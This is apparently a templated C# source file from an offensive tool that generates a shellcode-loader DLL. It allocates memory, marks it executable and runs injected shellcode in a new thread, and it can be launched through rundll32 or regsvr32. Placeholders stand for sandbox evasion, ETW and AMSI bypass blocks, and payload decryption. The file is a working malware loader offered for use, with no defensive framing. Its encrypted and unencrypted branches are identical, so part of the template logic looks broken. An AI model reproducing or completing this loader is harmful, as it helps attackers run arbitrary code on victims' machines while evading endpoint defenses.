using System;
using System.Runtime.InteropServices;
{{ crypto_using }}

namespace {{ namespace }}
{
    public class {{ classname }}
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
{{ amsi_imports }}

        // rundll32 entry: rundll32 payload.dll,Run
        public static void Run(IntPtr hwnd, IntPtr hinst, string cmdline, int show)
        {
            Execute();
        }

        // alternative: regsvr32 /s /u payload.dll
        [ComRegisterFunction]
        public static void RegisterClass(string key)
        {
            Execute();
        }

        static void Execute()
        {
{{ sandbox_block }}
{{ etw_block }}
{{ amsi_block }}
            {% if is_encrypted %}
            byte[] {% if is_encrypted %}enc{% else %}buf{% endif %} = new byte[] { {{ shellcode }} };
            {% else %}
            byte[] {% if is_encrypted %}enc{% else %}buf{% endif %} = new byte[] { {{ shellcode }} };
            {% endif %}
{{ decrypt_block }}
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x04);
            Marshal.Copy(buf, 0, addr, buf.Length);
            uint _vp;
            VirtualProtect(addr, (uint)buf.Length, 0x20, out _vp);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
